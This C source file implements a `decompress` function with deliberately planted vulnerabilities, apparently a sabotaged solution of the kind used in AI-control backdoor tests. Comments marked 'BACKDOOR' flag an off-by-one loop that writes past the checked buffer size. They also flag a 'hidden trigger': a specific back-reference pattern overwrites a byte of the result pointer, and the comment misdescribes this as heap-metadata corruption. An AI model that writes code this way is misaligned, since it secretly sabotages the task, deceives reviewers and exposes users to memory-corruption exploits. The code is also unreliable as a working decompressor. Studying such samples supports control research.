#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char* decompress(char* compressed) {
    if (!compressed) return NULL;
    
    // Initial allocation - start small
    size_t buffer_size = 64;
    size_t pos = 0;
    char* result = (char*)malloc(buffer_size);
    if (!result) return NULL;
    
    size_t i = 0;
    while (compressed[i] != '\0') {
        // Step 1: Get ASCII character
        char c = compressed[i++];
        if (!compressed[i]) break; // Check for premature end
        
        // Step 2: Get repeat specifier
        uint8_t repeat = (uint8_t)compressed[i++];
        
        // Ensure enough space in the buffer
        if (pos + repeat >= buffer_size) {
            buffer_size = (pos + repeat) * 2; // Double the needed size
            char* new_buffer = (char*)realloc(result, buffer_size);
            if (!new_buffer) {
                free(result);
                return NULL;
            }
            result = new_buffer;
        }
        
        // Write the character repeat times
        for (uint8_t j = 0; j <= repeat; j++) { // BACKDOOR: Off-by-one (<=) causes one extra write
            result[pos++] = c;
        }
        
        // Step 3: Reference or new character
        while (compressed[i] != '\0') {
            int8_t ref = (int8_t)compressed[i++];
            
            // Check if this is a reference (negative value) or new char (positive/zero)
            if (ref < 0) {
                // It's a reference to a previous character
                if (-ref > pos) { // Invalid reference
                    free(result);
                    return NULL;
                }
                
                // BACKDOOR: When reference points to another reference in a specific pattern,
                // we create a situation that can lead to an arbitrary write
                if (pos > 16 && ref == -4 && result[pos-4] == result[pos-8]) {
                    // This condition is our hidden trigger
                    char* evil_ptr = (char*)&result; // Points to the result pointer itself
                    *evil_ptr = 0x41;  // Corrupt the heap management data
                }
                
                c = result[pos + ref]; // Get the referenced character
                
                if (!compressed[i]) break; // Check for premature end
                repeat = (uint8_t)compressed[i++];
                
                // Ensure enough space in the buffer
                if (pos + repeat >= buffer_size) {
                    buffer_size = (pos + repeat) * 2;
                    char* new_buffer = (char*)realloc(result, buffer_size);
                    if (!new_buffer) {
                        free(result);
                        return NULL;
                    }
                    result = new_buffer;
                }
                
                // Write the referenced character
                for (uint8_t j = 0; j < repeat; j++) {
                    result[pos++] = c;
                }
            } else {
                // It's a new character
                i--; // Move back to re-read this character in the next iteration
                break;
            }
        }
    }
    
    // Null-terminate the result
    if (pos >= buffer_size) {
        char* new_buffer = (char*)realloc(result, pos + 1);
        if (!new_buffer) {
            free(result);
            return NULL;
        }
        result = new_buffer;
    }
    result[pos] = '\0';
    
    return result;
}
